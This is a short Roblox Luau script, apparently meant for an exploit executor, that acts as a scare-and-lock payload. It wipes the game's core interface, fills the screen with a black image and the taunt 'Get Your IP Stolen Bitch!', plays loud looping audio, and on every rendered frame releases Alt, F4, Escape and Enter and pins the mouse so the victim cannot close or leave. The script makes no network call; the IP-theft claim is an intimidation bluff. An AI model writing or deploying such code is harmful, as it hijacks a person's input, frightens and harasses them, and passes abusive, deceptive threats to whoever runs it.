game:GetService("CoreGui"):ClearAllChildren();
wait(0.2)
-- Create a ScreenGui to hold the image and text
local gui = Instance.new("ScreenGui")
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Create a Frame to hold the black background
local frame = Instance.new("Frame")
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BackgroundTransparency = 0
frame.BorderSizePixel = 0
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Parent = gui

-- Create an ImageLabel to display the image
local image = Instance.new("ImageLabel")
image.Image = "rbxassetid://6862780932"
image.BackgroundTransparency = 1
image.Size = UDim2.new(1, 0, 1, 0)
image.Parent = frame

-- Create a TextLabel to display the text
local text = Instance.new("TextLabel")
text.Text = "Get Your IP Stolen Bitch!"
text.TextSize = 64
text.Font = Enum.Font.SourceSansBold
text.TextColor3 = Color3.new(1, 0, 0)
text.BackgroundTransparency = 1
text.Position = UDim2.new(0.5, 0, 0.85, 0)
text.AnchorPoint = Vector2.new(0.5, 0.5)
text.Parent = image

-- Play audio
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://7145686856"
sound.Volume = 8
sound.Looped = true
sound.Parent = gui
sound:Play()
wait(0.1)

local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera


local disabledKeyCodes = {
    0x73;
    0xA4;
    0xA5;
    0x1B;
    0x0D;
};
wait()
runService.RenderStepped:Connect(function()
    for _, keyCode in next, disabledKeyCodes do
        keyrelease(keyCode)
    end

    mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);
end);
wait()
